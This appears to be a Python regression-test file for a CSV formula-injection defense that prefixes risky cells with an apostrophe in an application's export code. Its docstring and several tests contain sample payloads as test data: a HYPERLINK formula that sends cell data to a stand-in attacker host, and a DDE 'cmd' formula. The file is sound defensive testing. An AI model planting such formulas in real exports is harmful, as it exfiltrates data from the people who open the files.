"""F283 — CSV formula-injection defense (closes F138).

Excel / Google Sheets / LibreOffice interpret any cell whose first
character is one of ``= + - @ TAB CR`` as a formula when the CSV
is opened. An attacker who plants ``=HYPERLINK("https://attacker/
steal?d="&A1, "Click")`` in a contact name (or any other
user-controlled string field) can exfiltrate row data when an
admin opens the export.

The OWASP-recommended mitigation is a single-quote prefix that
Excel/Sheets strip on display while breaking the formula trigger.
F283 ships ``_csv_safe`` in ``export.py`` and applies it inside
``_iter_csv`` so all three exports get the defense automatically.

These tests exercise ``_csv_safe`` directly + verify ``_iter_csv``
emits escaped output. The end-to-end CSV-open-in-Excel verification
is captured in the F138 finding's "Live-verified" notes; structural
coverage here ensures the defense doesn't regress as exports evolve.
"""
from __future__ import annotations

import os
import pathlib

os.environ.setdefault(
    "DATABASE_URL",
    "postgresql+asyncpg://placeholder:placeholder@localhost:5432/placeholder",
)
os.environ.setdefault(
    "DATABASE_URL_SYNC",
    "postgresql://placeholder:placeholder@localhost:5432/placeholder",
)
os.environ.setdefault("REDIS_URL", "redis://localhost:6379/0")
os.environ.setdefault("JWT_SECRET", "pytest-f283")


def _import_helpers():
    """Lazy import so the env-var setup above runs first."""
    from app.api.v1.export import _csv_safe, _iter_csv, _CSV_FORMULA_TRIGGERS
    return _csv_safe, _iter_csv, _CSV_FORMULA_TRIGGERS


def test_csv_safe_prefixes_equals_payload():
    """The ``=HYPERLINK(...)`` exfiltration vector and any other
    formula starting with ``=`` must be defanged.
    """
    _csv_safe, _, _ = _import_helpers()
    assert _csv_safe("=HYPERLINK(\"http://attacker/steal\")") == "'=HYPERLINK(\"http://attacker/steal\")"
    assert _csv_safe("=1+1") == "'=1+1"
    assert _csv_safe("=cmd|'/c calc'!A1") == "'=cmd|'/c calc'!A1"


def test_csv_safe_prefixes_all_formula_triggers():
    """Plus, minus, at-sign, tab, and CR are all Excel formula
    triggers (per Microsoft's documentation). Each must be
    defanged.
    """
    _csv_safe, _, triggers = _import_helpers()
    for trigger in triggers:
        payload = f"{trigger}malicious"
        defanged = _csv_safe(payload)
        assert defanged.startswith("'"), (
            f"F283 regression: ``_csv_safe`` no longer defangs the "
            f"{trigger!r} prefix (a known Excel formula trigger)."
        )
        assert defanged[1:] == payload, (
            f"F283 regression: ``_csv_safe`` corrupted the payload "
            f"after defang. Expected ``'`` + payload, got {defanged!r}."
        )


def test_csv_safe_passes_through_safe_strings():
    """Normal strings (no leading trigger char) must be returned
    unchanged. Otherwise the escape would burn through cell width
    on every export and confuse downstream parsers.
    """
    _csv_safe, _, _ = _import_helpers()
    safe_inputs = [
        "Acme Corp",
        "https://example.com",
        "user@example.com",  # @ is only triggered as the FIRST char
        "1500-2000",  # leading digit, not -
        "John Doe",
        "100%",  # % is fine
        "",  # empty string
    ]
    for s in safe_inputs:
        assert _csv_safe(s) == s, (
            f"F283 regression: ``_csv_safe`` now mutates safe "
            f"input {s!r} -> {_csv_safe(s)!r}. False positives "
            f"corrupt every export."
        )


def test_csv_safe_passes_through_non_strings():
    """Numbers, None, booleans serialise via csv.writer and can't
    start with a trigger character. The escape must be no-op for
    them — otherwise a cell like ``int(123)`` would become
    ``str("'123")`` and confuse spreadsheet auto-typing.
    """
    _csv_safe, _, _ = _import_helpers()
    for value in (123, 12.5, None, True, False):
        assert _csv_safe(value) == value, (
            f"F283 regression: ``_csv_safe`` mutated non-string "
            f"value {value!r} -> {_csv_safe(value)!r}."
        )


def test_iter_csv_defangs_data_rows():
    """The end-to-end shape: feed a row containing a formula
    payload through ``_iter_csv`` and the emitted CSV bytes must
    have the leading apostrophe baked in.
    """
    _, _iter_csv, _ = _import_helpers()
    columns = ["company", "name"]
    rows = [
        ["Acme", "=HYPERLINK(\"http://attacker/steal\")"],
        ["BigCorp", "+1234"],
        ["Normal", "John Doe"],
    ]
    output = "".join(_iter_csv(rows, columns))
    # Header line emitted as-is (column names are static)
    assert "company,name" in output
    # Formula payload must be prefixed with apostrophe
    assert "'=HYPERLINK" in output, (
        "F283 regression: ``_iter_csv`` no longer defangs cells "
        "starting with ``=``. CSV-formula-injection vector is open."
    )
    assert "'+1234" in output, (
        "F283 regression: ``_iter_csv`` no longer defangs cells "
        "starting with ``+`` (Excel formula trigger)."
    )
    # Plain text passes through unchanged.
    assert "Normal,John Doe" in output, (
        "F283 regression: ``_iter_csv`` is now mutating safe "
        "cells. False positives corrupt every export."
    )


def test_iter_csv_defangs_header_row_for_symmetry():
    """If a future column name starts with a trigger char (e.g.
    a user-named saved-filter column), the header must also be
    defanged. The escape is no-op for normal column names.
    """
    _, _iter_csv, _ = _import_helpers()
    output = "".join(_iter_csv([], ["@malicious_header", "normal_col"]))
    assert "'@malicious_header" in output, (
        "F283 regression: header escape was removed. A future "
        "user-controlled column name (saved filters, custom "
        "exports) starting with a trigger char would re-open the "
        "vector."
    )


def test_csv_formula_triggers_constant_covers_owasp_set():
    """The trigger set must include the OWASP-documented chars.
    Removing any of them re-opens the vector for the corresponding
    formula prefix.
    """
    _, _, triggers = _import_helpers()
    required = {"=", "+", "-", "@", "\t", "\r"}
    missing = required - set(triggers)
    assert not missing, (
        f"F283 regression: ``_CSV_FORMULA_TRIGGERS`` no longer "
        f"covers the OWASP-documented set. Missing: {missing!r}."
    )
